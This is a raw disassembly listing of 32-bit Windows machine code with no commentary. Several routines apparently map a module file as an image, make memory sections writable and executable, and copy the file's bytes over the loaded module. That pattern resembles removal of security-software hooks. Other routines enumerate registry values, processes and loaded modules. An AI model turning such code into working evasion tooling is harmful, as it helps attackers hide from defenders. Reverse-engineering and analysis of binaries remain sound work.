  402679:	cc                   	int3
  40267a:	cc                   	int3
  40267b:	cc                   	int3
  40267c:	cc                   	int3
  40267d:	cc                   	int3
  40267e:	cc                   	int3
  40267f:	cc                   	int3
  402680:	55                   	push   %ebp
  402681:	8b ec                	mov    %esp,%ebp
  402683:	51                   	push   %ecx
  402684:	56                   	push   %esi
  402685:	8b 71 3c             	mov    0x3c(%ecx),%esi
  402688:	57                   	push   %edi
  402689:	8d 79 18             	lea    0x18(%ecx),%edi
  40268c:	03 fe                	add    %esi,%edi
  40268e:	0f b7 44 0e 14       	movzwl 0x14(%esi,%ecx,1),%eax
  402693:	03 f8                	add    %eax,%edi
  402695:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402698:	3b 57 14             	cmp    0x14(%edi),%edx
  40269b:	73 08                	jae    0x4026a5
  40269d:	5f                   	pop    %edi
  40269e:	8b c2                	mov    %edx,%eax
  4026a0:	5e                   	pop    %esi
  4026a1:	8b e5                	mov    %ebp,%esp
  4026a3:	5d                   	pop    %ebp
  4026a4:	c3                   	ret
  4026a5:	53                   	push   %ebx
  4026a6:	0f b7 5c 0e 06       	movzwl 0x6(%esi,%ecx,1),%ebx
  4026ab:	33 c0                	xor    %eax,%eax
  4026ad:	33 c9                	xor    %ecx,%ecx
  4026af:	66 3b cb             	cmp    %bx,%cx
  4026b2:	73 32                	jae    0x4026e6
  4026b4:	0f b7 c8             	movzwl %ax,%ecx
  4026b7:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  4026ba:	8d 34 cf             	lea    (%edi,%ecx,8),%esi
  4026bd:	8b 7e 0c             	mov    0xc(%esi),%edi
  4026c0:	3b d7                	cmp    %edi,%edx
  4026c2:	72 09                	jb     0x4026cd
  4026c4:	8b 4e 10             	mov    0x10(%esi),%ecx
  4026c7:	03 cf                	add    %edi,%ecx
  4026c9:	3b d1                	cmp    %ecx,%edx
  4026cb:	72 0b                	jb     0x4026d8
  4026cd:	40                   	inc    %eax
  4026ce:	66 3b c3             	cmp    %bx,%ax
  4026d1:	73 13                	jae    0x4026e6
  4026d3:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4026d6:	eb dc                	jmp    0x4026b4
  4026d8:	8b 46 14             	mov    0x14(%esi),%eax
  4026db:	5b                   	pop    %ebx
  4026dc:	2b c7                	sub    %edi,%eax
  4026de:	5f                   	pop    %edi
  4026df:	03 c2                	add    %edx,%eax
  4026e1:	5e                   	pop    %esi
  4026e2:	8b e5                	mov    %ebp,%esp
  4026e4:	5d                   	pop    %ebp
  4026e5:	c3                   	ret
  4026e6:	5b                   	pop    %ebx
  4026e7:	5f                   	pop    %edi
  4026e8:	33 c0                	xor    %eax,%eax
  4026ea:	5e                   	pop    %esi
  4026eb:	8b e5                	mov    %ebp,%esp
  4026ed:	5d                   	pop    %ebp
  4026ee:	c3                   	ret
  4026ef:	cc                   	int3
  4026f0:	55                   	push   %ebp
  4026f1:	8b ec                	mov    %esp,%ebp
  4026f3:	81 ec 34 02 00 00    	sub    $0x234,%esp
  4026f9:	a1 04 60 41 00       	mov    0x416004,%eax
  4026fe:	33 c5                	xor    %ebp,%eax
  402700:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402703:	56                   	push   %esi
  402704:	8b f1                	mov    %ecx,%esi
  402706:	85 f6                	test   %esi,%esi
  402708:	0f 84 cb 01 00 00    	je     0x4028d9
  40270e:	57                   	push   %edi
  40270f:	8b 3d f4 f0 40 00    	mov    0x40f0f4,%edi
  402715:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40271b:	50                   	push   %eax
  40271c:	ff d7                	call   *%edi
  40271e:	50                   	push   %eax
  40271f:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  402725:	85 c0                	test   %eax,%eax
  402727:	74 10                	je     0x402739
  402729:	83 bd ec fd ff ff 00 	cmpl   $0x0,-0x214(%ebp)
  402730:	74 07                	je     0x402739
  402732:	68 c8 3e 41 00       	push   $0x413ec8
  402737:	eb 05                	jmp    0x40273e
  402739:	68 f4 3e 41 00       	push   $0x413ef4
  40273e:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402744:	50                   	push   %eax
  402745:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  40274b:	56                   	push   %esi
  40274c:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402752:	50                   	push   %eax
  402753:	ff 15 74 f0 40 00    	call   *0x40f074
  402759:	56                   	push   %esi
  40275a:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  402760:	8b f0                	mov    %eax,%esi
  402762:	89 b5 d8 fd ff ff    	mov    %esi,-0x228(%ebp)
  402768:	85 f6                	test   %esi,%esi
  40276a:	0f 84 68 01 00 00    	je     0x4028d8
  402770:	6a 0c                	push   $0xc
  402772:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  402778:	c7 85 e4 fd ff ff 00 	movl   $0x0,-0x21c(%ebp)
  40277f:	00 00 00 
  402782:	50                   	push   %eax
  402783:	0f 57 c0             	xorps  %xmm0,%xmm0
  402786:	56                   	push   %esi
  402787:	66 0f d6 85 dc fd ff 	movq   %xmm0,-0x224(%ebp)
  40278e:	ff 
  40278f:	ff d7                	call   *%edi
  402791:	50                   	push   %eax
  402792:	ff 15 7c f0 40 00    	call   *0x40f07c
  402798:	85 c0                	test   %eax,%eax
  40279a:	0f 84 31 01 00 00    	je     0x4028d1
  4027a0:	53                   	push   %ebx
  4027a1:	6a 00                	push   $0x0
  4027a3:	6a 00                	push   $0x0
  4027a5:	6a 03                	push   $0x3
  4027a7:	6a 00                	push   $0x0
  4027a9:	6a 01                	push   $0x1
  4027ab:	68 00 00 00 80       	push   $0x80000000
  4027b0:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4027b6:	50                   	push   %eax
  4027b7:	ff 15 20 f1 40 00    	call   *0x40f120
  4027bd:	8b d8                	mov    %eax,%ebx
  4027bf:	89 9d ec fd ff ff    	mov    %ebx,-0x214(%ebp)
  4027c5:	83 fb ff             	cmp    $0xffffffff,%ebx
  4027c8:	0f 84 02 01 00 00    	je     0x4028d0
  4027ce:	6a 00                	push   $0x0
  4027d0:	6a 00                	push   $0x0
  4027d2:	6a 00                	push   $0x0
  4027d4:	68 02 00 00 01       	push   $0x1000002
  4027d9:	6a 00                	push   $0x0
  4027db:	53                   	push   %ebx
  4027dc:	ff 15 bc f0 40 00    	call   *0x40f0bc
  4027e2:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  4027e8:	85 c0                	test   %eax,%eax
  4027ea:	0f 84 d9 00 00 00    	je     0x4028c9
  4027f0:	6a 00                	push   $0x0
  4027f2:	6a 00                	push   $0x0
  4027f4:	6a 00                	push   $0x0
  4027f6:	6a 04                	push   $0x4
  4027f8:	50                   	push   %eax
  4027f9:	ff 15 c0 f0 40 00    	call   *0x40f0c0
  4027ff:	89 85 d0 fd ff ff    	mov    %eax,-0x230(%ebp)
  402805:	85 c0                	test   %eax,%eax
  402807:	0f 84 b0 00 00 00    	je     0x4028bd
  40280d:	8b 8d dc fd ff ff    	mov    -0x224(%ebp),%ecx
  402813:	33 c0                	xor    %eax,%eax
  402815:	33 f6                	xor    %esi,%esi
  402817:	8b 79 3c             	mov    0x3c(%ecx),%edi
  40281a:	03 f9                	add    %ecx,%edi
  40281c:	66 3b 47 06          	cmp    0x6(%edi),%ax
  402820:	0f 83 91 00 00 00    	jae    0x4028b7
  402826:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%eax,%eax,1)
  40282d:	00 00 00 
  402830:	0f b7 c6             	movzwl %si,%eax
  402833:	68 20 3f 41 00       	push   $0x413f20
  402838:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  40283b:	0f b7 47 14          	movzwl 0x14(%edi),%eax
  40283f:	03 c7                	add    %edi,%eax
  402841:	8d 49 03             	lea    0x3(%ecx),%ecx
  402844:	8d 1c c8             	lea    (%eax,%ecx,8),%ebx
  402847:	53                   	push   %ebx
  402848:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  40284e:	ff 15 b4 f0 40 00    	call   *0x40f0b4
  402854:	85 c0                	test   %eax,%eax
  402856:	74 09                	je     0x402861
  402858:	46                   	inc    %esi
  402859:	66 3b 77 06          	cmp    0x6(%edi),%si
  40285d:	72 d1                	jb     0x402830
  40285f:	eb 50                	jmp    0x4028b1
  402861:	8b bd d4 fd ff ff    	mov    -0x22c(%ebp),%edi
  402867:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  40286d:	8b 5b 0c             	mov    0xc(%ebx),%ebx
  402870:	03 9d dc fd ff ff    	add    -0x224(%ebp),%ebx
  402876:	8b 35 f8 f0 40 00    	mov    0x40f0f8,%esi
  40287c:	8b 7f 08             	mov    0x8(%edi),%edi
  40287f:	50                   	push   %eax
  402880:	6a 40                	push   $0x40
  402882:	57                   	push   %edi
  402883:	53                   	push   %ebx
  402884:	ff d6                	call   *%esi
  402886:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  40288c:	57                   	push   %edi
  40288d:	8b 40 0c             	mov    0xc(%eax),%eax
  402890:	03 85 d0 fd ff ff    	add    -0x230(%ebp),%eax
  402896:	50                   	push   %eax
  402897:	53                   	push   %ebx
  402898:	e8 d3 29 00 00       	call   0x405270
  40289d:	83 c4 0c             	add    $0xc,%esp
  4028a0:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  4028a6:	50                   	push   %eax
  4028a7:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  4028ad:	57                   	push   %edi
  4028ae:	53                   	push   %ebx
  4028af:	ff d6                	call   *%esi
  4028b1:	8b 9d ec fd ff ff    	mov    -0x214(%ebp),%ebx
  4028b7:	8b b5 d8 fd ff ff    	mov    -0x228(%ebp),%esi
  4028bd:	ff b5 cc fd ff ff    	push   -0x234(%ebp)
  4028c3:	ff 15 18 f1 40 00    	call   *0x40f118
  4028c9:	53                   	push   %ebx
  4028ca:	ff 15 18 f1 40 00    	call   *0x40f118
  4028d0:	5b                   	pop    %ebx
  4028d1:	56                   	push   %esi
  4028d2:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  4028d8:	5f                   	pop    %edi
  4028d9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4028dc:	33 cd                	xor    %ebp,%ecx
  4028de:	5e                   	pop    %esi
  4028df:	e8 61 0e 00 00       	call   0x403745
  4028e4:	8b e5                	mov    %ebp,%esp
  4028e6:	5d                   	pop    %ebp
  4028e7:	c3                   	ret
  4028e8:	cc                   	int3
  4028e9:	cc                   	int3
  4028ea:	cc                   	int3
  4028eb:	cc                   	int3
  4028ec:	cc                   	int3
  4028ed:	cc                   	int3
  4028ee:	cc                   	int3
  4028ef:	cc                   	int3
  4028f0:	55                   	push   %ebp
  4028f1:	8b ec                	mov    %esp,%ebp
  4028f3:	81 ec e8 00 00 00    	sub    $0xe8,%esp
  4028f9:	a1 04 60 41 00       	mov    0x416004,%eax
  4028fe:	33 c5                	xor    %ebp,%eax
  402900:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402903:	53                   	push   %ebx
  402904:	57                   	push   %edi
  402905:	6a 00                	push   $0x0
  402907:	6a 00                	push   $0x0
  402909:	6a 00                	push   $0x0
  40290b:	6a 00                	push   $0x0
  40290d:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  402913:	8b da                	mov    %edx,%ebx
  402915:	50                   	push   %eax
  402916:	6a 00                	push   $0x0
  402918:	6a 00                	push   $0x0
  40291a:	6a 00                	push   $0x0
  40291c:	6a 00                	push   $0x0
  40291e:	6a 00                	push   $0x0
  402920:	6a 00                	push   $0x0
  402922:	53                   	push   %ebx
  402923:	89 9d 1c ff ff ff    	mov    %ebx,-0xe4(%ebp)
  402929:	8b f9                	mov    %ecx,%edi
  40292b:	ff 15 10 f0 40 00    	call   *0x40f010
  402931:	85 c0                	test   %eax,%eax
  402933:	0f 85 f3 00 00 00    	jne    0x402a2c
  402939:	56                   	push   %esi
  40293a:	33 f6                	xor    %esi,%esi
  40293c:	89 b5 18 ff ff ff    	mov    %esi,-0xe8(%ebp)
  402942:	39 b5 30 ff ff ff    	cmp    %esi,-0xd0(%ebp)
  402948:	0f 86 dd 00 00 00    	jbe    0x402a2b
  40294e:	66 90                	xchg   %ax,%ax
  402950:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  402956:	c7 85 28 ff ff ff 64 	movl   $0x64,-0xd8(%ebp)
  40295d:	00 00 00 
  402960:	50                   	push   %eax
  402961:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  402967:	c7 85 2c ff ff ff 04 	movl   $0x4,-0xd4(%ebp)
  40296e:	00 00 00 
  402971:	50                   	push   %eax
  402972:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402978:	50                   	push   %eax
  402979:	6a 00                	push   $0x0
  40297b:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  402981:	50                   	push   %eax
  402982:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  402988:	50                   	push   %eax
  402989:	56                   	push   %esi
  40298a:	53                   	push   %ebx
  40298b:	ff 15 3c f0 40 00    	call   *0x40f03c
  402991:	85 c0                	test   %eax,%eax
  402993:	0f 85 7f 00 00 00    	jne    0x402a18
  402999:	83 bd 24 ff ff ff 04 	cmpl   $0x4,-0xdc(%ebp)
  4029a0:	75 76                	jne    0x402a18
  4029a2:	8b 17                	mov    (%edi),%edx
  4029a4:	33 c9                	xor    %ecx,%ecx
  4029a6:	8b 9d 20 ff ff ff    	mov    -0xe0(%ebp),%ebx
  4029ac:	85 d2                	test   %edx,%edx
  4029ae:	74 0f                	je     0x4029bf
  4029b0:	8b 47 08             	mov    0x8(%edi),%eax
  4029b3:	39 18                	cmp    %ebx,(%eax)
  4029b5:	74 5b                	je     0x402a12
  4029b7:	41                   	inc    %ecx
  4029b8:	83 c0 04             	add    $0x4,%eax
  4029bb:	3b ca                	cmp    %edx,%ecx
  4029bd:	72 f4                	jb     0x4029b3
  4029bf:	8b 47 04             	mov    0x4(%edi),%eax
  4029c2:	3b d0                	cmp    %eax,%edx
  4029c4:	75 42                	jne    0x402a08
  4029c6:	83 c0 10             	add    $0x10,%eax
  4029c9:	33 c9                	xor    %ecx,%ecx
  4029cb:	89 47 04             	mov    %eax,0x4(%edi)
  4029ce:	ba 04 00 00 00       	mov    $0x4,%edx
  4029d3:	f7 e2                	mul    %edx
  4029d5:	0f 90 c1             	seto   %cl
  4029d8:	f7 d9                	neg    %ecx
  4029da:	0b c8                	or     %eax,%ecx
  4029dc:	51                   	push   %ecx
  4029dd:	e8 76 0d 00 00       	call   0x403758
  4029e2:	8b 0f                	mov    (%edi),%ecx
  4029e4:	8b f0                	mov    %eax,%esi
  4029e6:	c1 e1 02             	shl    $0x2,%ecx
  4029e9:	51                   	push   %ecx
  4029ea:	ff 77 08             	push   0x8(%edi)
  4029ed:	56                   	push   %esi
  4029ee:	e8 7d 28 00 00       	call   0x405270
  4029f3:	8b 4f 08             	mov    0x8(%edi),%ecx
  4029f6:	51                   	push   %ecx
  4029f7:	89 77 08             	mov    %esi,0x8(%edi)
  4029fa:	e8 54 0d 00 00       	call   0x403753
  4029ff:	8b b5 18 ff ff ff    	mov    -0xe8(%ebp),%esi
  402a05:	83 c4 14             	add    $0x14,%esp
  402a08:	8b 0f                	mov    (%edi),%ecx
  402a0a:	8b 47 08             	mov    0x8(%edi),%eax
  402a0d:	89 1c 88             	mov    %ebx,(%eax,%ecx,4)
  402a10:	ff 07                	incl   (%edi)
  402a12:	8b 9d 1c ff ff ff    	mov    -0xe4(%ebp),%ebx
  402a18:	46                   	inc    %esi
  402a19:	89 b5 18 ff ff ff    	mov    %esi,-0xe8(%ebp)
  402a1f:	3b b5 30 ff ff ff    	cmp    -0xd0(%ebp),%esi
  402a25:	0f 82 25 ff ff ff    	jb     0x402950
  402a2b:	5e                   	pop    %esi
  402a2c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a2f:	5f                   	pop    %edi
  402a30:	33 cd                	xor    %ebp,%ecx
  402a32:	5b                   	pop    %ebx
  402a33:	e8 0d 0d 00 00       	call   0x403745
  402a38:	8b e5                	mov    %ebp,%esp
  402a3a:	5d                   	pop    %ebp
  402a3b:	c3                   	ret
  402a3c:	cc                   	int3
  402a3d:	cc                   	int3
  402a3e:	cc                   	int3
  402a3f:	cc                   	int3
  402a40:	55                   	push   %ebp
  402a41:	8b ec                	mov    %esp,%ebp
  402a43:	81 ec e4 00 00 00    	sub    $0xe4,%esp
  402a49:	a1 04 60 41 00       	mov    0x416004,%eax
  402a4e:	33 c5                	xor    %ebp,%eax
  402a50:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a53:	56                   	push   %esi
  402a54:	57                   	push   %edi
  402a55:	6a 00                	push   $0x0
  402a57:	6a 00                	push   $0x0
  402a59:	6a 00                	push   $0x0
  402a5b:	6a 00                	push   $0x0
  402a5d:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  402a63:	8b f2                	mov    %edx,%esi
  402a65:	50                   	push   %eax
  402a66:	6a 00                	push   $0x0
  402a68:	6a 00                	push   $0x0
  402a6a:	6a 00                	push   $0x0
  402a6c:	6a 00                	push   $0x0
  402a6e:	6a 00                	push   $0x0
  402a70:	6a 00                	push   $0x0
  402a72:	56                   	push   %esi
  402a73:	89 b5 20 ff ff ff    	mov    %esi,-0xe0(%ebp)
  402a79:	8b f9                	mov    %ecx,%edi
  402a7b:	ff 15 10 f0 40 00    	call   *0x40f010
  402a81:	85 c0                	test   %eax,%eax
  402a83:	0f 85 58 01 00 00    	jne    0x402be1
  402a89:	53                   	push   %ebx
  402a8a:	68 0a 02 00 00       	push   $0x20a
  402a8f:	e8 c4 0c 00 00       	call   0x403758
  402a94:	8b d8                	mov    %eax,%ebx
  402a96:	83 c4 04             	add    $0x4,%esp
  402a99:	33 c0                	xor    %eax,%eax
  402a9b:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  402aa1:	39 85 30 ff ff ff    	cmp    %eax,-0xd0(%ebp)
  402aa7:	0f 86 2a 01 00 00    	jbe    0x402bd7
  402aad:	0f 1f 00             	nopl   (%eax)
  402ab0:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  402ab6:	c7 85 28 ff ff ff 64 	movl   $0x64,-0xd8(%ebp)
  402abd:	00 00 00 
  402ac0:	51                   	push   %ecx
  402ac1:	53                   	push   %ebx
  402ac2:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  402ac8:	c7 85 2c ff ff ff 04 	movl   $0x104,-0xd4(%ebp)
  402acf:	01 00 00 
  402ad2:	51                   	push   %ecx
  402ad3:	6a 00                	push   $0x0
  402ad5:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  402adb:	51                   	push   %ecx
  402adc:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  402ae2:	51                   	push   %ecx
  402ae3:	50                   	push   %eax
  402ae4:	56                   	push   %esi
  402ae5:	ff 15 3c f0 40 00    	call   *0x40f03c
  402aeb:	85 c0                	test   %eax,%eax
  402aed:	0f 85 cb 00 00 00    	jne    0x402bbe
  402af3:	83 bd 24 ff ff ff 01 	cmpl   $0x1,-0xdc(%ebp)
  402afa:	0f 85 be 00 00 00    	jne    0x402bbe
  402b00:	8b 07                	mov    (%edi),%eax
  402b02:	33 f6                	xor    %esi,%esi
  402b04:	85 c0                	test   %eax,%eax
  402b06:	74 2f                	je     0x402b37
  402b08:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
  402b0c:	8b 47 0c             	mov    0xc(%edi),%eax
  402b0f:	53                   	push   %ebx
  402b10:	ff 34 b0             	push   (%eax,%esi,4)
  402b13:	74 08                	je     0x402b1d
  402b15:	ff 15 c8 f0 40 00    	call   *0x40f0c8
  402b1b:	eb 06                	jmp    0x402b23
  402b1d:	ff 15 cc f0 40 00    	call   *0x40f0cc
  402b23:	f7 d8                	neg    %eax
  402b25:	1b c0                	sbb    %eax,%eax
  402b27:	40                   	inc    %eax
  402b28:	85 c0                	test   %eax,%eax
  402b2a:	0f 85 88 00 00 00    	jne    0x402bb8
  402b30:	8b 07                	mov    (%edi),%eax
  402b32:	46                   	inc    %esi
  402b33:	3b f0                	cmp    %eax,%esi
  402b35:	72 d1                	jb     0x402b08
  402b37:	8b 4f 04             	mov    0x4(%edi),%ecx
  402b3a:	3b c1                	cmp    %ecx,%eax
  402b3c:	75 3c                	jne    0x402b7a
  402b3e:	8d 41 10             	lea    0x10(%ecx),%eax
  402b41:	ba 04 00 00 00       	mov    $0x4,%edx
  402b46:	33 c9                	xor    %ecx,%ecx
  402b48:	89 47 04             	mov    %eax,0x4(%edi)
  402b4b:	f7 e2                	mul    %edx
  402b4d:	0f 90 c1             	seto   %cl
  402b50:	f7 d9                	neg    %ecx
  402b52:	0b c8                	or     %eax,%ecx
  402b54:	51                   	push   %ecx
  402b55:	e8 fe 0b 00 00       	call   0x403758
  402b5a:	8b 0f                	mov    (%edi),%ecx
  402b5c:	8b f0                	mov    %eax,%esi
  402b5e:	c1 e1 02             	shl    $0x2,%ecx
  402b61:	51                   	push   %ecx
  402b62:	ff 77 0c             	push   0xc(%edi)
  402b65:	56                   	push   %esi
  402b66:	e8 05 27 00 00       	call   0x405270
  402b6b:	8b 4f 0c             	mov    0xc(%edi),%ecx
  402b6e:	51                   	push   %ecx
  402b6f:	89 77 0c             	mov    %esi,0xc(%edi)
  402b72:	e8 dc 0b 00 00       	call   0x403753
  402b77:	83 c4 14             	add    $0x14,%esp
  402b7a:	53                   	push   %ebx
  402b7b:	ff 15 28 f1 40 00    	call   *0x40f128
  402b81:	33 c9                	xor    %ecx,%ecx
  402b83:	40                   	inc    %eax
  402b84:	ba 02 00 00 00       	mov    $0x2,%edx
  402b89:	f7 e2                	mul    %edx
  402b8b:	0f 90 c1             	seto   %cl
  402b8e:	f7 d9                	neg    %ecx
  402b90:	0b c8                	or     %eax,%ecx
  402b92:	51                   	push   %ecx
  402b93:	e8 c0 0b 00 00       	call   0x403758
  402b98:	8b 17                	mov    (%edi),%edx
  402b9a:	83 c4 04             	add    $0x4,%esp
  402b9d:	8b 4f 0c             	mov    0xc(%edi),%ecx
  402ba0:	53                   	push   %ebx
  402ba1:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  402ba4:	8b 0f                	mov    (%edi),%ecx
  402ba6:	8b 47 0c             	mov    0xc(%edi),%eax
  402ba9:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  402bac:	8d 41 01             	lea    0x1(%ecx),%eax
  402baf:	52                   	push   %edx
  402bb0:	89 07                	mov    %eax,(%edi)
  402bb2:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  402bb8:	8b b5 20 ff ff ff    	mov    -0xe0(%ebp),%esi
  402bbe:	8b 85 1c ff ff ff    	mov    -0xe4(%ebp),%eax
  402bc4:	40                   	inc    %eax
  402bc5:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  402bcb:	3b 85 30 ff ff ff    	cmp    -0xd0(%ebp),%eax
  402bd1:	0f 82 d9 fe ff ff    	jb     0x402ab0
  402bd7:	53                   	push   %ebx
  402bd8:	e8 76 0b 00 00       	call   0x403753
  402bdd:	83 c4 04             	add    $0x4,%esp
  402be0:	5b                   	pop    %ebx
  402be1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402be4:	5f                   	pop    %edi
  402be5:	33 cd                	xor    %ebp,%ecx
  402be7:	5e                   	pop    %esi
  402be8:	e8 58 0b 00 00       	call   0x403745
  402bed:	8b e5                	mov    %ebp,%esp
  402bef:	5d                   	pop    %ebp
  402bf0:	c3                   	ret
  402bf1:	cc                   	int3
  402bf2:	cc                   	int3
  402bf3:	cc                   	int3
  402bf4:	cc                   	int3
  402bf5:	cc                   	int3
  402bf6:	cc                   	int3
  402bf7:	cc                   	int3
  402bf8:	cc                   	int3
  402bf9:	cc                   	int3
  402bfa:	cc                   	int3
  402bfb:	cc                   	int3
  402bfc:	cc                   	int3
  402bfd:	cc                   	int3
  402bfe:	cc                   	int3
  402bff:	cc                   	int3
  402c00:	55                   	push   %ebp
  402c01:	8b ec                	mov    %esp,%ebp
  402c03:	81 ec 28 02 00 00    	sub    $0x228,%esp
  402c09:	a1 04 60 41 00       	mov    0x416004,%eax
  402c0e:	33 c5                	xor    %ebp,%eax
  402c10:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402c13:	56                   	push   %esi
  402c14:	57                   	push   %edi
  402c15:	33 ff                	xor    %edi,%edi
  402c17:	89 95 dc fd ff ff    	mov    %edx,-0x224(%ebp)
  402c1d:	68 40 9c 00 00       	push   $0x9c40
  402c22:	8b f1                	mov    %ecx,%esi
  402c24:	c7 85 d8 fd ff ff 01 	movl   $0x1,-0x228(%ebp)
  402c2b:	00 00 00 
  402c2e:	89 bd ec fd ff ff    	mov    %edi,-0x214(%ebp)
  402c34:	e8 1f 0b 00 00       	call   0x403758
  402c39:	68 40 9c 00 00       	push   $0x9c40
  402c3e:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
  402c44:	89 bd f4 fd ff ff    	mov    %edi,-0x20c(%ebp)
  402c4a:	e8 09 0b 00 00       	call   0x403758
  402c4f:	83 c4 08             	add    $0x8,%esp
  402c52:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  402c58:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402c5e:	89 bd f8 fd ff ff    	mov    %edi,-0x208(%ebp)
  402c64:	50                   	push   %eax
  402c65:	68 40 9c 00 00       	push   $0x9c40
  402c6a:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  402c70:	ff 15 14 f1 40 00    	call   *0x40f114
  402c76:	85 c0                	test   %eax,%eax
  402c78:	0f 84 7d 01 00 00    	je     0x402dfb
  402c7e:	8b 85 f4 fd ff ff    	mov    -0x20c(%ebp),%eax
  402c84:	c1 e8 02             	shr    $0x2,%eax
  402c87:	53                   	push   %ebx
  402c88:	33 db                	xor    %ebx,%ebx
  402c8a:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  402c90:	85 c0                	test   %eax,%eax
  402c92:	0f 84 62 01 00 00    	je     0x402dfa
  402c98:	83 c6 08             	add    $0x8,%esi
  402c9b:	89 b5 e4 fd ff ff    	mov    %esi,-0x21c(%ebp)
  402ca1:	8b 85 f0 fd ff ff    	mov    -0x210(%ebp),%eax
  402ca7:	ff 34 98             	push   (%eax,%ebx,4)
  402caa:	6a 00                	push   $0x0
  402cac:	68 10 04 00 00       	push   $0x410
  402cb1:	ff 15 68 f0 40 00    	call   *0x40f068
  402cb7:	8b f8                	mov    %eax,%edi
  402cb9:	85 ff                	test   %edi,%edi
  402cbb:	0f 84 26 01 00 00    	je     0x402de7
  402cc1:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402cc7:	50                   	push   %eax
  402cc8:	68 40 9c 00 00       	push   $0x9c40
  402ccd:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  402cd3:	57                   	push   %edi
  402cd4:	ff 15 b8 f0 40 00    	call   *0x40f0b8
  402cda:	85 c0                	test   %eax,%eax
  402cdc:	0f 84 fe 00 00 00    	je     0x402de0
  402ce2:	8b 85 f8 fd ff ff    	mov    -0x208(%ebp),%eax
  402ce8:	33 f6                	xor    %esi,%esi
  402cea:	c1 e8 02             	shr    $0x2,%eax
  402ced:	89 85 f8 fd ff ff    	mov    %eax,-0x208(%ebp)
  402cf3:	85 c0                	test   %eax,%eax
  402cf5:	0f 84 e5 00 00 00    	je     0x402de0
  402cfb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  402d00:	6a 00                	push   $0x0
  402d02:	68 00 02 00 00       	push   $0x200
  402d07:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  402d0d:	50                   	push   %eax
  402d0e:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  402d14:	ff 34 b0             	push   (%eax,%esi,4)
  402d17:	57                   	push   %edi
  402d18:	ff 15 9c f0 40 00    	call   *0x40f09c
  402d1e:	85 c0                	test   %eax,%eax
  402d20:	74 25                	je     0x402d47
  402d22:	66 8b 8d 3c fe ff ff 	mov    -0x1c4(%ebp),%cx
  402d29:	b8 77 72 00 00       	mov    $0x7277,%eax
  402d2e:	66 3b c8             	cmp    %ax,%cx
  402d31:	74 22                	je     0x402d55
  402d33:	b8 73 72 00 00       	mov    $0x7273,%eax
  402d38:	66 3b c8             	cmp    %ax,%cx
  402d3b:	74 18                	je     0x402d55
  402d3d:	b8 68 72 00 00       	mov    $0x7268,%eax
  402d42:	66 3b c8             	cmp    %ax,%cx
  402d45:	74 0e                	je     0x402d55
  402d47:	46                   	inc    %esi
  402d48:	3b b5 f8 fd ff ff    	cmp    -0x208(%ebp),%esi
  402d4e:	72 b0                	jb     0x402d00
  402d50:	e9 8b 00 00 00       	jmp    0x402de0
  402d55:	8b 85 dc fd ff ff    	mov    -0x224(%ebp),%eax
  402d5b:	8b 95 ec fd ff ff    	mov    -0x214(%ebp),%edx
  402d61:	3b 10                	cmp    (%eax),%edx
  402d63:	73 71                	jae    0x402dd6
  402d65:	8b 85 f0 fd ff ff    	mov    -0x210(%ebp),%eax
  402d6b:	8b b5 e4 fd ff ff    	mov    -0x21c(%ebp),%esi
  402d71:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  402d74:	89 46 f8             	mov    %eax,-0x8(%esi)
  402d77:	b8 77 72 00 00       	mov    $0x7277,%eax
